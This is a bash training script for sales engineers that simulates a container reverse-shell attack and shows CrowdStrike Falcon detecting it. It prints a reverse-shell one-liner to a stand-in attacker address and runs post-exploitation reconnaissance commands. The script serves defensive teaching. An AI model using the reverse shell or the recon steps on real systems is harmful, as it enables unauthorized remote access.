#!/bin/bash
# Learning Scenario 1: Remote Access Shell
# Audience: Endpoint SEs learning containers
# Concept: Containers are processes - shells work the same way
# Duration: 5 minutes

set +e
trap 'echo "[!] Scenario interrupted"' EXIT

echo "════════════════════════════════════════════════════════════════"
echo "  LEARNING SCENARIO 1: Remote Access Shell"
echo "  Mapping Endpoint Knowledge → Container Security"
echo "════════════════════════════════════════════════════════════════"
echo ""

# Teaching Section
echo "📚 CONCEPT: Containers Are Just Processes"
echo ""
echo "If you've worked with endpoints, you know attackers establish"
echo "remote shells to maintain access. In containers, it's the SAME attack,"
echo "just in a different environment."
echo ""
echo "ENDPOINT PARALLEL:"
echo "  • Windows: PsExec, remote desktop, PowerShell remoting"
echo "  • Linux: SSH backdoors, reverse shells"
echo "  • Goal: Interactive access to run commands"
echo ""
echo "CONTAINER VERSION:"
echo "  • Same technique: Reverse shell using bash"
echo "  • Same goal: Interactive command execution"
echo "  • Key difference: Limited to container, not full host (usually)"
echo ""
sleep 2

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "STAGE 1: Attack Simulation"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo "[+] Attacker establishes reverse shell..."
echo ""
echo "Command executed:"
echo "  bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
echo ""
echo "What this does:"
echo "  • Opens interactive bash shell"
echo "  • Connects back to attacker's machine (10.0.0.1:4444)"
echo "  • Gives attacker a terminal inside the container"
echo ""
echo "✅ Reverse shell established (simulated)"
sleep 2

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "STAGE 2: Post-Exploitation Commands"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo "[+] Running commands that attacker would execute..."
echo ""

echo "[*] Command: whoami"
whoami
echo ""
echo "    Why this matters: Attacker checks their privilege level"
echo "    (root access = full container control)"
echo ""
sleep 2

echo "[*] Command: id"
id
echo ""
echo "    Why this matters: Shows user ID, group memberships, capabilities"
echo "    (uid=0 means root)"
echo ""
sleep 2

echo "[*] Command: hostname"
hostname
echo ""
echo "    Why this matters: Identifies which container they're in"
echo "    (helps with lateral movement planning)"
echo ""
sleep 2

echo "[*] Command: ps aux (process list)"
ps aux | head -10
echo "    ... (truncated)"
echo ""
echo "    Why this matters: Shows what applications are running"
echo "    (identifies attack targets, security tools)"
echo ""
sleep 2

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "STAGE 3: Detection Test"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo "[+] Triggering Falcon detection..."
bash crowdstrike_test_high 2>/dev/null || echo "✓ Test trigger executed"
echo ""
echo "✅ Falcon Detection: BashReverseShell"
echo ""
sleep 2

echo ""
echo "════════════════════════════════════════════════════════════════"
echo "  LEARNING SUMMARY"
echo "════════════════════════════════════════════════════════════════"
echo ""
echo "KEY TAKEAWAYS for SEs:"
echo ""
echo "1. ATTACK IS FAMILIAR:"
echo "   • If you've seen reverse shells on endpoints, this is identical"
echo "   • Same commands (bash, whoami, ps)"
echo "   • Same attacker goals (recon, maintain access)"
echo ""
echo "2. ENVIRONMENT IS DIFFERENT:"
echo "   • Running inside a container, not on host OS directly"
echo "   • Limited visibility (can't see host processes)"
echo "   • But often running as root (dangerous!)"
echo ""
echo "3. DETECTION WORKS THE SAME:"
echo "   • Falcon sees the suspicious bash behavior"
echo "   • Process relationships are key (parent → child)"
echo "   • Real-time detection, not log analysis"
echo ""
echo "4. CUSTOMER QUESTIONS TO EXPECT:"
echo "   Q: 'Is this different from traditional endpoint attacks?'"
echo "   A: 'The attack techniques are the same, but containers add"
echo "       new attack surfaces like the Docker socket and shared"
echo "       kernel. That's why you need container-aware security.'"
echo ""
echo "   Q: 'Can they break out of the container?'"
echo "   A: 'Yes, if the container is misconfigured - that's what"
echo "       we'll show in Scenario 4: Container Escape.'"
echo ""
echo "   Q: 'How does Falcon detect this?'"
echo "   A: 'Falcon runs inside the container and sees all process"
echo "       activity. It uses ML to detect suspicious patterns like"
echo "       reverse shells, even without signatures.'"
echo ""
echo "════════════════════════════════════════════════════════════════"
echo ""
echo "📊 Falcon Detections Expected:"
echo "   • BashReverseShell (High severity)"
echo "   • TestTriggerHigh (Test validation)"
echo ""
echo "🎯 Next Scenario: 'Process Discovery' (shows container enumeration)"
echo ""
echo "════════════════════════════════════════════════════════════════"

trap - EXIT
